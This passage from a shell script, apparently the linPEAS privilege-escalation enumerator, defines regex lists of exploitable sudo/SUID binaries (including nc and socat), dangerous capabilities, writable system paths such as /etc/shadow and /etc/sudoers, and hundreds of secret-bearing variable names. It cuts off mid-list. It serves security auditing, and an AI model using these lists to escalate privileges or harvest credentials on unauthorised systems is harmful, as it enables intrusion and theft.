   396	sidVB2='/mysql$|/nano$|/nasm$|/nawk$|/nc$|/ncftp$|/nft$|/nice$|/nl$|/nm$|/nmap$|/node$|/nohup$|/octave$|/od$|/openssl$|/openvpn$|/pandoc$|/paste$|/pdflatex$|/pdftex$|/perf$|/perl$|/pexec$|/pg$|/php$|/pic$|/pico$|/pidstat$|/posh$|/pr$|/pry$|/psftp$|/ptx$|/python$|/rake$|/rc$|/readelf$|/restic$|/rev$|/rlwrap$|/rpm$|/rpmdb$|/rpmquery$|/rpmverify$|/rsync$|/rtorrent$|/run-parts$|/rview$|/rvim$|/sash$|/scanmem$|/scp$|/scrot$|/sed$|/setarch$|/setfacl$|/setlock$|/shuf$|/slsh$|/socat$|/soelim$|/softlimit$|/sort$|/sqlite3$|/ss$|/ssh-agent$|/ssh-keygen$|/ssh-keyscan$|/sshpass$|/start-stop-daemon$|/stdbuf$|/strace$|/strings$|/sysctl$|/systemctl$|/tac$|/tail$|/tar$|/taskset$|/tasksh$|/tbl$|/tclsh$|/tdbtool$|/tee$|/telnet$|/tex$|/tftp$|/tic$|/time$|/timeout$|/tmate$|/troff$|/ul$|/unexpand$|/uniq$|/unshare$|/unzip$|/update-alternatives$|/uudecode$|/uuencode$|/vagrant$|/view$|/vigr$|/vim$|/vimdiff$|/vipw$|/w3m$|/watch$|/wc$|/wget$|/whiptail$|/xargs$|/xdotool$|/xelatex$|/xetex$|/xmodmap$|/xmore$|/xxd$|/xz$|/yash$|/zip$|/zsh$|/zsoelim$'
   397	cfuncs='file|free|main|more|read|split|write'
   398	
   399	sudoVB1=" \*|env_keep\W*\+=.*LD_PRELOAD|env_keep\W*\+=.*LD_LIBRARY_PATH|7z$|aa-exec$|ab$|alpine$|ansible-playbook$|ansible-test$|aoss$|apt-get$|apt$|ar$|aria2c$|arj$|arp$|as$|ascii-xfr$|ascii85$|ash$|aspell$|at$|atobm$|awk$|aws$|base32$|base58$|base64$|basenc$|basez$|bash$|batcat$|bc$|bconsole$|bpftrace$|bridge$|bundle$|bundler$|busctl$|busybox$|byebug$|bzip2$|c89$|c99$|cabal$|capsh$|cat$|cdist$|certbot$|check_by_ssh$|check_cups$|check_log$|check_memory$|check_raid$|check_ssl_cert$|check_statusfile$|chmod$|choom$|chown$|chroot$|cmp$|cobc$|column$|comm$|composer$|cowsay$|cowthink$|cp$|cpan$|cpio$|cpulimit$|crash$|crontab$|csh$|csplit$|csvtool$|cupsfilter$|curl$|cut$|dash$|date$|dd$|debugfs$|dialog$|diff$|dig$|distcc$|dmesg$|dmidecode$|dmsetup$|dnf$|docker$|dosbox$|dotnet$|dpkg$|dstat$|dvips$|easy_install$|eb$|ed$|efax$|elvish$|emacs$|env$|eqn$|espeak$|ex$|exiftool$|expand$|expect$|facter$|file$|find$|fish$|flock$|fmt$|fold$|fping$|ftp$|gawk$|gcc$|gcloud$|gcore$|gdb$|gem$|genie$|genisoimage$|ghc$|ghci$|gimp$|ginsh$|git$|grc$|grep$|gtester$|gzip$|hd$|head$|hexdump$|highlight$|hping3$|iconv$|iftop$|install$|ionice$|ip$|irb$|ispell$|jjs$|joe$|join$|journalctl$|jq$|jrunscript$|jtag$|julia$|knife$|ksh$|ksshell$|ksu$|kubectl$|latex$|latexmk$|ldconfig$|less$|lftp$|ln$|loginctl$|logsave$|look$|ltrace$|lua$|lualatex$|luatex$|lwp-download$|lwp-request$|mail$|make$|man$|mawk$|more$|mosquitto$|mount$"
   400	sudoVB2="msfconsole$|msgattrib$|msgcat$|msgconv$|msgfilter$|msgmerge$|msguniq$|mtr$|multitime$|mv$|mysql$|nano$|nasm$|nawk$|nc$|ncftp$|neofetch$|nft$|nice$|nl$|nm$|nmap$|node$|nohup$|npm$|nroff$|nsenter$|octave$|od$|openssl$|openvpn$|openvt$|opkg$|pandoc$|paste$|pdb$|pdflatex$|pdftex$|perf$|perl$|perlbug$|pexec$|pg$|php$|pic$|pico$|pidstat$|pip$|pkexec$|pkg$|posh$|pr$|pry$|psftp$|psql$|ptx$|puppet$|pwsh$|python$|rake$|rc$|readelf$|red$|redcarpet$|restic$|rev$|rlwrap$|rpm$|rpmdb$|rpmquery$|rpmverify$|rsync$|ruby$|run-mailcap$|run-parts$|rview$|rvim$|sash$|scanmem$|scp$|screen$|script$|scrot$|sed$|service$|setarch$|setfacl$|setlock$|sftp$|sg$|shuf$|slsh$|smbclient$|snap$|socat$|soelim$|softlimit$|sort$|split$|sqlite3$|sqlmap$|ss$|ssh-agent$|ssh-keygen$|ssh-keyscan$|ssh$|sshpass$|start-stop-daemon$|stdbuf$|strace$|strings$|su$|sysctl$|systemctl$|systemd-resolve$|tac$|tail$|tar$|task$|taskset$|tasksh$|tbl$|tclsh$|tcpdump$|tdbtool$|tee$|telnet$|tex$|tftp$|tic$|time$|timedatectl$|timeout$|tmate$|tmux$|top$|torify$|torsocks$|troff$|ul$|unexpand$|uniq$|unshare$|unzip$|update-alternatives$|uudecode$|uuencode$|vagrant$|valgrind$|vi$|view$|vigr$|vim$|vimdiff$|vipw$|virsh$|w3m$|wall$|watch$|wc$|wget$|whiptail$|wireshark$|wish$|xargs$|xdotool$|xelatex$|xetex$|xmodmap$|xmore$|xpad$|xxd$|xz$|yarn$|yash$|yum$|zathura$|zip$|zsh$|zsoelim$|zypper$"
   401	sudoB="$(whoami)|ALL:ALL|ALL : ALL|ALL|env_keep|NOPASSWD|SETENV|/apache2|/cryptsetup|/mount"
   402	sudoG="NOEXEC"
   403	
   404	capsVB="cap_sys_admin:mount|python \
   405	cap_sys_ptrace:python \
   406	cap_sys_module:kmod|python \
   407	cap_dac_override:python|vim \
   408	cap_chown:chown|python \
   409	cap_former:chown|python \
   410	cap_setuid:gdb|node|perl|php|python|ruby|rview|rvim|view|vim|vimdiff \
   411	cap_setgid:gdb|node|perl|php|python|ruby|rview|rvim|view|vim|vimdiff \
   412	cap_net_raw:python|tcpdump"
   413	
   414	
   415	capsB="=ep|cap_chown|cap_former|cap_setfcap|cap_dac_override|cap_dac_read_search|cap_setuid|cap_setgid|cap_kill|cap_net_bind_service|cap_net_raw|cap_net_admin|cap_sys_admin|cap_sys_ptrace|cap_sys_module"
   416	containercapsB="sys_admin|sys_ptrace|sys_module|dac_read_search|dac_override|sys_rawio|syslog|net_raw|net_admin"
   417	
   418	OLDPATH=$PATH
   419	ADDPATH=":/usr/local/sbin\
   420	 :/usr/local/bin\
   421	 :/usr/sbin\
   422	 :/usr/bin\
   423	 :/sbin\
   424	 :/bin"
   425	spath=":$PATH"
   426	for P in $ADDPATH; do
   427	  if [ "${spath##*$P*}" ]; then export PATH="$PATH$P" 2>/dev/null; fi
   428	done
   429	
   430	# test if sed supports -E or -r
   431	E=E
   432	echo | sed -${E} 's/o/a/' 2>/dev/null
   433	if [ $? -ne 0 ] ; then
   434		echo | sed -r 's/o/a/' 2>/dev/null
   435		if [ $? -eq 0 ] ; then
   436			E=r
   437		else
   438			echo "${YELLOW}WARNING: No suitable option found for extended regex with sed. Continuing but the results might be unreliable.${NC}"
   439		fi
   440	fi
   441	
   442	writeB="00-header|10-help-text|50-motd-news|80-esm|91-release-upgrade|\.sh$|\./|/authorized_keys|/bin/|/boot/|/etc/apache2/apache2.conf|/etc/apache2/httpd.conf|/etc/hosts.allow|/etc/hosts.deny|/etc/httpd/conf/httpd.conf|/etc/httpd/httpd.conf|/etc/inetd.conf|/etc/incron.conf|/etc/login.defs|/etc/logrotate.d/|/etc/modprobe.d/|/etc/pam.d/|/etc/php.*/fpm/pool.d/|/etc/php/.*/fpm/pool.d/|/etc/rsyslog.d/|/etc/skel/|/etc/sysconfig/network-scripts/|/etc/sysctl.conf|/etc/sysctl.d/|/etc/uwsgi/apps-enabled/|/etc/xinetd.conf|/etc/xinetd.d/|/etc/|/home//|/lib/|/log/|/mnt/|/root|/sys/|/usr/bin|/usr/games|/usr/lib|/usr/local/bin|/usr/local/games|/usr/local/sbin|/usr/sbin|/sbin/|/var/log/|\.timer$|\.service$|.socket$"
   443	writeVB="/etc/anacrontab|/etc/apt/apt.conf.d|/etc/bash.bashrc|/etc/bash_completion|/etc/bash_completion.d/|/etc/cron|/etc/environment|/etc/environment.d/|/etc/group|/etc/incron.d/|/etc/init|/etc/ld.so.conf.d/|/etc/master.passwd|/etc/passwd|/etc/profile.d/|/etc/profile|/etc/rc.d|/etc/shadow|/etc/skey/|/etc/sudoers|/etc/sudoers.d/|/etc/supervisor/conf.d/|/etc/supervisor/supervisord.conf|/etc/systemd|/etc/sys|/lib/systemd|/etc/update-motd.d/|/root/.ssh/|/run/systemd|/usr/lib/cron/tabs/|/usr/lib/systemd|/systemd/system|/var/db/yubikey/|/var/spool/anacron|/var/spool/cron/crontabs|"$(echo $PATH 2>/dev/null | sed 's/:\.:/:/g' | sed 's/:\.$//g' | sed 's/^\.://g' | sed 's/:/$|^/g') #Add Path but remove simple dot in PATH
   444	
   445	if [ "$MACPEAS" ]; then
   446	  sh_usrs="ImPoSSssSiBlEee"
   447	  nosh_usrs="ImPoSSssSiBlEee"
   448	  dscl . list /Users | while read uname; do
   449	    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
   450	    if  grep -q \"$ushell\" /etc/shells; then sh_usrs="$sh_usrs|$uname"; else nosh_usrs="$nosh_usrs|$uname"; fi
   451	  done
   452	else
   453	  sh_usrs=$(cat /etc/passwd 2>/dev/null | grep -v "^root:" | grep -i "sh$" | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/' | sed 's/|sys|/|sys[\\\s:]|^sys$|/' | sed 's/|daemon|/|daemon[\\\s:]|^daemon$|/')"ImPoSSssSiBlEee" #Modified bin, sys and daemon so they are not colored everywhere
   454	  nosh_usrs=$(cat /etc/passwd 2>/dev/null | grep -i -v "sh$" | sort | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/')"ImPoSSssSiBlEee"
   455	fi
   456	knw_usrs='_amavisd|_analyticsd|_appinstalld|_appleevents|_applepay|_appowner|_appserver|_appstore|_ard|_assetcache|_astris|_atsserver|_avbdeviced|_calendar|_captiveagent|_ces|_clamav|_cmiodalassistants|_coreaudiod|_coremediaiod|_coreml|_ctkd|_cvmsroot|_cvs|_cyrus|_datadetectors|_demod|_devdocs|_devicemgr|_diskimagesiod|_displaypolicyd|_distnote|_dovecot|_dovenull|_dpaudio|_driverkit|_eppc|_findmydevice|_fpsd|_ftp|_fud|_gamecontrollerd|_geod|_hidd|_iconservices|_installassistant|_installcoordinationd|_installer|_jabber|_kadmin_admin|_kadmin_changepw|_knowledgegraphd|_krb_anonymous|_krb_changepw|_krb_kadmin|_krb_kerberos|_krb_krbtgt|_krbfast|_krbtgt|_launchservicesd|_lda|_locationd|_logd|_lp|_mailman|_mbsetupuser|_mcxalr|_mdnsresponder|_mobileasset|_mysql|_nearbyd|_netbios|_netstatistics|_networkd|_nsurlsessiond|_nsurlstoraged|_oahd|_ondemand|_postfix|_postgres|_qtss|_reportmemoryexception|_rmd|_sandbox|_screensaver|_scsd|_securityagent|_softwareupdate|_spotlight|_sshd|_svn|_taskgated|_teamsserver|_timed|_timezone|_tokend|_trustd|_trustevaluationagent|_unknown|_update_sharing|_usbmuxd|_uucp|_warmd|_webauthserver|_windowserver|_www|_wwwproxy|_xserverdocs|daemon\W|^daemon$|message\+|syslog|www|www-data|mail|noboby|Debian\-\+|rtkit|systemd\+'
   457	if ! [ "$USER" ]; then
   458	  USER=$(whoami 2>/dev/null || echo -n "UserUnknown")
   459	fi
   460	if [ ! "$HOME" ]; then
   461	  if [ -d "/Users/$USER" ]; then HOME="/Users/$USER"; #Mac home
   462	  else HOME="/home/$USER";
   463	  fi
   464	fi
   465	Groups="ImPoSSssSiBlEee"$(groups "$USER" 2>/dev/null | cut -d ":" -f 2 | tr ' ' '|')
   466	
   467	#This variables are dived in several different ones because NetBSD required it
   468	pwd_inside_history="az login|enable_autologin|7z|unzip|useradd|linenum|linpeas|mkpasswd|htpasswd|openssl|PASSW|passw|shadow|roadrecon auth|root|snyk|sudo|^su|pkexec|^ftp|mongo|psql|mysql|rdesktop|Save-AzContext|xfreerdp|^ssh|steghide|@|KEY=|TOKEN=|BEARER=|Authorization:|chpasswd"
   469	
   470	pwd_in_variables1="Dgpg.passphrase|Dsonar.login|Dsonar.projectKey|GITHUB_TOKEN|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|PUSHOVER_TOKEN|PUSHOVER_USER|VIRUSTOTAL_APIKEY|ACCESSKEY|ACCESSKEYID|ACCESS_KEY|ACCESS_KEY_ID|ACCESS_KEY_SECRET|ACCESS_SECRET|ACCESS_TOKEN|ACCOUNT_SID|ADMIN_EMAIL|ADZERK_API_KEY|ALGOLIA_ADMIN_KEY_1|ALGOLIA_ADMIN_KEY_2|ALGOLIA_ADMIN_KEY_MCM|ALGOLIA_API_KEY|ALGOLIA_API_KEY_MCM|ALGOLIA_API_KEY_SEARCH|ALGOLIA_APPLICATION_ID|ALGOLIA_APPLICATION_ID_1|ALGOLIA_APPLICATION_ID_2|ALGOLIA_APPLICATION_ID_MCM|ALGOLIA_APP_ID|ALGOLIA_APP_ID_MCM|ALGOLIA_SEARCH_API_KEY|ALGOLIA_SEARCH_KEY|ALGOLIA_SEARCH_KEY_1|ALIAS_NAME|ALIAS_PASS|ALICLOUD_ACCESS_KEY|ALICLOUD_SECRET_KEY|amazon_bucket_name|AMAZON_SECRET_ACCESS_KEY|ANDROID_DOCS_DEPLOY_TOKEN|android_sdk_license|android_sdk_preview_license|aos_key|aos_sec|APIARY_API_KEY|APIGW_ACCESS_TOKEN|API_KEY|API_KEY_MCM|API_KEY_SECRET|API_KEY_SID|API_SECRET|appClientSecret|APP_BUCKET_PERM|APP_NAME|APP_REPORT_TOKEN_KEY|APP_TOKEN|ARGOS_TOKEN|ARTIFACTORY_KEY|ARTIFACTS_AWS_ACCESS_KEY_ID|ARTIFACTS_AWS_SECRET_ACCESS_KEY|ARTIFACTS_BUCKET|ARTIFACTS_KEY|ARTIFACTS_SECRET|ASSISTANT_IAM_APIKEY|AURORA_STRING_URL|AUTH0_API_CLIENTID|AUTH0_API_CLIENTSECRET|AUTH0_AUDIENCE|AUTH0_CALLBACK_URL|AUTH0_CLIENT_ID"
   471	pwd_in_variables2="AUTH0_CLIENT_SECRET|AUTH0_CONNECTION|AUTH0_DOMAIN|AUTHOR_EMAIL_ADDR|AUTHOR_NPM_API_KEY|AUTH_TOKEN|AWS-ACCT-ID|AWS-KEY|AWS-SECRETS|AWS.config.accessKeyId|AWS.config.secretAccessKey|AWSACCESSKEYID|AWSCN_ACCESS_KEY_ID|AWSCN_SECRET_ACCESS_KEY|AWSSECRETKEY|AWS_ACCESS|AWS_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_CF_DIST_ID|AWS_DEFAULT|AWS_DEFAULT_REGION|AWS_S3_BUCKET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_SECRET_KEY|AWS_SES_ACCESS_KEY_ID|AWS_SES_SECRET_ACCESS_KEY|B2_ACCT_ID|B2_APP_KEY|B2_BUCKET|baseUrlTravis|bintrayKey|bintrayUser|BINTRAY_APIKEY|BINTRAY_API_KEY|BINTRAY_KEY|BINTRAY_TOKEN|BINTRAY_USER|BLUEMIX_ACCOUNT|BLUEMIX_API_KEY|BLUEMIX_AUTH|BLUEMIX_NAMESPACE|BLUEMIX_ORG|BLUEMIX_ORGANIZATION|BLUEMIX_PASS|BLUEMIX_PASS_PROD|BLUEMIX_SPACE|BLUEMIX_USER|BRACKETS_REPO_OAUTH_TOKEN|BROWSERSTACK_ACCESS_KEY|BROWSERSTACK_PROJECT_NAME|BROWSER_STACK_ACCESS_KEY|BUCKETEER_AWS_ACCESS_KEY_ID|BUCKETEER_AWS_SECRET_ACCESS_KEY|BUCKETEER_BUCKET_NAME|BUILT_BRANCH_DEPLOY_KEY|BUNDLESIZE_GITHUB_TOKEN|CACHE_S3_SECRET_KEY|CACHE_URL|CARGO_TOKEN|CATTLE_ACCESS_KEY|CATTLE_AGENT_INSTANCE_AUTH|CATTLE_SECRET_KEY|CC_TEST_REPORTER_ID|CC_TEST_REPOTER_ID|CENSYS_SECRET|CENSYS_UID|CERTIFICATE_OSX_P12|CF_ORGANIZATION|CF_PROXY_HOST|channelId|CHEVERNY_TOKEN|CHROME_CLIENT_ID"
   472	pwd_in_variables3="CHROME_CLIENT_SECRET|CHROME_EXTENSION_ID|CHROME_REFRESH_TOKEN|CI_DEPLOY_USER|CI_NAME|CI_PROJECT_NAMESPACE|CI_PROJECT_URL|CI_REGISTRY_USER|CI_SERVER_NAME|CI_USER_TOKEN|CLAIMR_DATABASE|CLAIMR_DB|CLAIMR_SUPERUSER|CLAIMR_TOKEN|CLIENT_ID|CLIENT_SECRET|CLI_E2E_CMA_TOKEN|CLI_E2E_ORG_ID|CLOUDAMQP_URL|CLOUDANT_APPLIANCE_DATABASE|CLOUDANT_ARCHIVED_DATABASE|CLOUDANT_AUDITED_DATABASE|CLOUDANT_DATABASE|CLOUDANT_ORDER_DATABASE|CLOUDANT_PARSED_DATABASE|CLOUDANT_PROCESSED_DATABASE|CLOUDANT_SERVICE_DATABASE|CLOUDFLARE_API_KEY|CLOUDFLARE_AUTH_EMAIL|CLOUDFLARE_AUTH_KEY|CLOUDFLARE_EMAIL|CLOUDFLARE_ZONE_ID|CLOUDINARY_URL|CLOUDINARY_URL_EU|CLOUDINARY_URL_STAGING|CLOUD_API_KEY|CLUSTER_NAME|CLU_REPO_URL|CLU_SSH_PRIVATE_KEY_BASE64|CN_ACCESS_KEY_ID|CN_SECRET_ACCESS_KEY|COCOAPODS_TRUNK_EMAIL|COCOAPODS_TRUNK_TOKEN|CODACY_PROJECT_TOKEN|CODECLIMATE_REPO_TOKEN|CODECOV_TOKEN|coding_token|CONEKTA_APIKEY|CONFIGURATION_PROFILE_SID|CONFIGURATION_PROFILE_SID_P2P|CONFIGURATION_PROFILE_SID_SFU|CONSUMERKEY|CONSUMER_KEY|CONTENTFUL_ACCESS_TOKEN|CONTENTFUL_CMA_TEST_TOKEN|CONTENTFUL_INTEGRATION_MANAGEMENT_TOKEN|CONTENTFUL_INTEGRATION_SOURCE_SPACE|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN_NEW|CONTENTFUL_ORGANIZATION"
   473	pwd_in_variables4="CONTENTFUL_PHP_MANAGEMENT_TEST_TOKEN|CONTENTFUL_TEST_ORG_CMA_TOKEN|CONTENTFUL_V2_ACCESS_TOKEN|CONTENTFUL_V2_ORGANIZATION|CONVERSATION_URL|COREAPI_HOST|COS_SECRETS|COVERALLS_API_TOKEN|COVERALLS_REPO_TOKEN|COVERALLS_SERVICE_NAME|COVERALLS_TOKEN|COVERITY_SCAN_NOTIFICATION_EMAIL|COVERITY_SCAN_TOKEN|CYPRESS_RECORD_KEY|DANGER_GITHUB_API_TOKEN|DATABASE_HOST|DATABASE_NAME|DATABASE_PORT|DATABASE_USER|DATABASE_PASSWORD|datadog_api_key|datadog_app_key|DB_CONNECTION|DB_DATABASE|DB_HOST|DB_PORT|DB_PW|DB_USER|DDGC_GITHUB_TOKEN|DDG_TEST_EMAIL|DDG_TEST_EMAIL_PW|DEPLOY_DIR|DEPLOY_DIRECTORY|DEPLOY_HOST|DEPLOY_PORT|DEPLOY_SECURE|DEPLOY_TOKEN|DEPLOY_USER|DEST_TOPIC|DHL_SOLDTOACCOUNTID|DH_END_POINT_1|DH_END_POINT_2|DIGITALOCEAN_ACCESS_TOKEN|DIGITALOCEAN_SSH_KEY_BODY|DIGITALOCEAN_SSH_KEY_IDS|DOCKER_EMAIL|DOCKER_KEY|DOCKER_PASSDOCKER_POSTGRES_URL|DOCKER_RABBITMQ_HOST|docker_repo|DOCKER_TOKEN|DOCKER_USER|DOORDASH_AUTH_TOKEN|DROPBOX_OAUTH_BEARER|ELASTICSEARCH_HOST|ELASTIC_CLOUD_AUTH|env.GITHUB_OAUTH_TOKEN|env.HEROKU_API_KEY|ENV_KEY|ENV_SECRET|ENV_SECRET_ACCESS_KEY|eureka.awsAccessId"
   474	pwd_in_variables5="eureka.awsSecretKey|ExcludeRestorePackageImports|EXPORT_SPACE_ID|FIREBASE_API_JSON|FIREBASE_API_TOKEN|FIREBASE_KEY|FIREBASE_PROJECT|FIREBASE_PROJECT_DEVELOP|FIREBASE_PROJECT_ID|FIREBASE_SERVICE_ACCOUNT|FIREBASE_TOKEN|FIREFOX_CLIENT|FIREFOX_ISSUER|FIREFOX_SECRET|FLASK_SECRET_KEY|FLICKR_API_KEY|FLICKR_API_SECRET|FOSSA_API_KEY|ftp_host|FTP_LOGIN|FTP_PW|FTP_USER|GCLOUD_BUCKET|GCLOUD_PROJECT|GCLOUD_SERVICE_KEY|GCS_BUCKET|GHB_TOKEN|GHOST_API_KEY|GH_API_KEY|GH_EMAIL|GH_NAME|GH_NEXT_OAUTH_CLIENT_ID|GH_NEXT_OAUTH_CLIENT_SECRET|GH_NEXT_UNSTABLE_OAUTH_CLIENT_ID|GH_NEXT_UNSTABLE_OAUTH_CLIENT_SECRET|GH_OAUTH_CLIENT_ID|GH_OAUTH_CLIENT_SECRET|GH_OAUTH_TOKEN|GH_REPO_TOKEN|GH_TOKEN|GH_UNSTABLE_OAUTH_CLIENT_ID|GH_UNSTABLE_OAUTH_CLIENT_SECRET|GH_USER_EMAIL|GH_USER_NAME|GITHUB_ACCESS_TOKEN|GITHUB_API_KEY|GITHUB_API_TOKEN|GITHUB_AUTH|GITHUB_AUTH_TOKEN|GITHUB_AUTH_USER|GITHUB_CLIENT_ID|GITHUB_CLIENT_SECRET|GITHUB_DEPLOYMENT_TOKEN|GITHUB_DEPLOY_HB_DOC_PASS|GITHUB_HUNTER_TOKEN|GITHUB_KEY|GITHUB_OAUTH|GITHUB_OAUTH_TOKEN|GITHUB_RELEASE_TOKEN|GITHUB_REPO|GITHUB_TOKEN|GITHUB_TOKENS|GITHUB_USER|GITLAB_USER_EMAIL|GITLAB_USER_LOGIN|GIT_AUTHOR_EMAIL|GIT_AUTHOR_NAME|GIT_COMMITTER_EMAIL|GIT_COMMITTER_NAME|GIT_EMAIL|GIT_NAME|GIT_TOKEN|GIT_USER"
   475	pwd_in_variables6="GOOGLE_CLIENT_EMAIL|GOOGLE_CLIENT_ID|GOOGLE_CLIENT_SECRET|GOOGLE_MAPS_API_KEY|GOOGLE_PRIVATE_KEY|gpg.passphrase|GPG_EMAIL|GPG_ENCRYPTION|GPG_EXECUTABLE|GPG_KEYNAME|GPG_KEY_NAME|GPG_NAME|GPG_OWNERTRUST|GPG_PASSPHRASE|GPG_PRIVATE_KEY|GPG_SECRET_KEYS|gradle.publish.key|gradle.publish.secret|GRADLE_SIGNING_KEY_ID|GREN_GITHUB_TOKEN|GRGIT_USER|HAB_AUTH_TOKEN|HAB_KEY|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|HEROKU_API_KEY|HEROKU_API_USER|HEROKU_EMAIL|HEROKU_TOKEN|HOCKEYAPP_TOKEN|INTEGRATION_TEST_API_KEY|INTEGRATION_TEST_APPID|INTERNAL-SECRETS|IOS_DOCS_DEPLOY_TOKEN|IRC_NOTIFICATION_CHANNEL|JDBC:MYSQL|jdbc_databaseurl|jdbc_host|jdbc_user|JWT_SECRET|KAFKA_ADMIN_URL|KAFKA_INSTANCE_NAME|KAFKA_REST_URL|KEYSTORE_PASS|KOVAN_PRIVATE_KEY|LEANPLUM_APP_ID|LEANPLUM_KEY|LICENSES_HASH|LICENSES_HASH_TWO|LIGHTHOUSE_API_KEY|LINKEDIN_CLIENT_ID|LINKEDIN_CLIENT_SECRET|LINODE_INSTANCE_ID|LINODE_VOLUME_ID|LINUX_SIGNING_KEY|LL_API_SHORTNAME|LL_PUBLISH_URL|LL_SHARED_KEY|LOOKER_TEST_RUNNER_CLIENT_ID|LOOKER_TEST_RUNNER_CLIENT_SECRET|LOOKER_TEST_RUNNER_ENDPOINT|LOTTIE_HAPPO_API_KEY|LOTTIE_HAPPO_SECRET_KEY|LOTTIE_S3_API_KEY|LOTTIE_S3_SECRET_KEY|mailchimp_api_key|MAILCHIMP_KEY|mailchimp_list_id|mailchimp_user|MAILER_HOST|MAILER_TRANSPORT|MAILER_USER"
   476	pwd_in_variables7="MAILGUN_APIKEY|MAILGUN_API_KEY|MAILGUN_DOMAIN|MAILGUN_PRIV_KEY|MAILGUN_PUB_APIKEY|MAILGUN_PUB_KEY|MAILGUN_SECRET_API_KEY|MAILGUN_TESTDOMAIN|ManagementAPIAccessToken|MANAGEMENT_TOKEN|MANAGE_KEY|MANAGE_SECRET|MANDRILL_API_KEY|MANIFEST_APP_TOKEN|MANIFEST_APP_URL|MapboxAccessToken|MAPBOX_ACCESS_TOKEN|MAPBOX_API_TOKEN|MAPBOX_AWS_ACCESS_KEY_ID|MAPBOX_AWS_SECRET_ACCESS_KEY|MG_API_KEY|MG_DOMAIN|MG_EMAIL_ADDR|MG_EMAIL_TO|MG_PUBLIC_API_KEY|MG_SPEND_MONEY|MG_URL|MH_APIKEY|MILE_ZERO_KEY|MINIO_ACCESS_KEY|MINIO_SECRET_KEY|MYSQLMASTERUSER|MYSQLSECRET|MYSQL_DATABASE|MYSQL_HOSTNAMEMYSQL_USER|MY_SECRET_ENV|NETLIFY_API_KEY|NETLIFY_SITE_ID|NEW_RELIC_BETA_TOKEN|NGROK_AUTH_TOKEN|NGROK_TOKEN|node_pre_gyp_accessKeyId|NODE_PRE_GYP_GITHUB_TOKEN|node_pre_gyp_secretAccessKey|NPM_API_KEY|NPM_API_TOKEN|NPM_AUTH_TOKEN|NPM_EMAIL|NPM_SECRET_KEY|NPM_TOKEN|NUGET_APIKEY|NUGET_API_KEY|NUGET_KEY|NUMBERS_SERVICE|NUMBERS_SERVICE_PASS|NUMBERS_SERVICE_USER|OAUTH_TOKEN|OBJECT_STORAGE_PROJECT_ID|OBJECT_STORAGE_USER_ID|OBJECT_STORE_BUCKET|OBJECT_STORE_CREDS|OCTEST_SERVER_BASE_URL|OCTEST_SERVER_BASE_URL_2|OC_PASS|OFTA_KEY|OFTA_SECRET|OKTA_CLIENT_TOKEN|OKTA_DOMAIN|OKTA_OAUTH2_CLIENTID|OKTA_OAUTH2_CLIENTSECRET|OKTA_OAUTH2_CLIENT_ID|OKTA_OAUTH2_CLIENT_SECRET"
   477	pwd_in_variables8="OKTA_OAUTH2_ISSUER|OMISE_KEY|OMISE_PKEY|OMISE_PUBKEY|OMISE_SKEY|ONESIGNAL_API_KEY|ONESIGNAL_USER_AUTH_KEY|OPENWHISK_KEY|OPEN_WHISK_KEY|OSSRH_PASS|OSSRH_SECRET|OSSRH_USER|OS_AUTH_URL|OS_PROJECT_NAME|OS_TENANT_ID|OS_TENANT_NAME|PAGERDUTY_APIKEY|PAGERDUTY_ESCALATION_POLICY_ID|PAGERDUTY_FROM_USER|PAGERDUTY_PRIORITY_ID|PAGERDUTY_SERVICE_ID|PANTHEON_SITE|PARSE_APP_ID|PARSE_JS_KEY|PAYPAL_CLIENT_ID|PAYPAL_CLIENT_SECRET|PERCY_TOKEN|PERSONAL_KEY|PERSONAL_SECRET|PG_DATABASE|PG_HOST|PLACES_APIKEY|PLACES_API_KEY|PLACES_APPID|PLACES_APPLICATION_ID|PLOTLY_APIKEY|POSTGRESQL_DB|POSTGRESQL_PASS|POSTGRES_ENV_POSTGRES_DB|POSTGRES_ENV_POSTGRES_USER|POSTGRES_PORT|PREBUILD_AUTH|PROD.ACCESS.KEY.ID|PROD.SECRET.KEY|PROD_BASE_URL_RUNSCOPE|PROJECT_CONFIG|PUBLISH_KEY|PUBLISH_SECRET|PUSHOVER_TOKEN|PUSHOVER_USER|PYPI_PASSOWRD|QUIP_TOKEN|RABBITMQ_SERVER_ADDR|REDISCLOUD_URL|REDIS_STUNNEL_URLS|REFRESH_TOKEN|RELEASE_GH_TOKEN|RELEASE_TOKEN|remoteUserToShareTravis|REPORTING_WEBDAV_URL|REPORTING_WEBDAV_USER|repoToken|REST_API_KEY|RINKEBY_PRIVATE_KEY|ROPSTEN_PRIVATE_KEY|route53_access_key_id|RTD_KEY_PASS|RTD_STORE_PASS|RUBYGEMS_AUTH_TOKEN|s3_access_key|S3_ACCESS_KEY_ID|S3_BUCKET_NAME_APP_LOGS|S3_BUCKET_NAME_ASSETS|S3_KEY"
   478	pwd_in_variables9="S3_KEY_APP_LOGS|S3_KEY_ASSETS|S3_PHOTO_BUCKET|S3_SECRET_APP_LOGS|S3_SECRET_ASSETS|S3_SECRET_KEY|S3_USER_ID|S3_USER_SECRET|SACLOUD_ACCESS_TOKEN|SACLOUD_ACCESS_TOKEN_SECRET|SACLOUD_API|SALESFORCE_BULK_TEST_SECURITY_TOKEN|SANDBOX_ACCESS_TOKEN|SANDBOX_AWS_ACCESS_KEY_ID|SANDBOX_AWS_SECRET_ACCESS_KEY|SANDBOX_LOCATION_ID|SAUCE_ACCESS_KEY|SECRETACCESSKEY|SECRETKEY|SECRET_0|SECRET_10|SECRET_11|SECRET_1|SECRET_2|SECRET_3|SECRET_4|SECRET_5|SECRET_6|SECRET_7|SECRET_8|SECRET_9|SECRET_KEY_BASE|SEGMENT_API_KEY|SELION_SELENIUM_SAUCELAB_GRID_CONFIG_FILE|SELION_SELENIUM_USE_SAUCELAB_GRID|SENDGRID|SENDGRID_API_KEY|SENDGRID_FROM_ADDRESS|SENDGRID_KEY|SENDGRID_USER|SENDWITHUS_KEY|SENTRY_AUTH_TOKEN|SERVICE_ACCOUNT_SECRET|SES_ACCESS_KEY|SES_SECRET_KEY|setDstAcces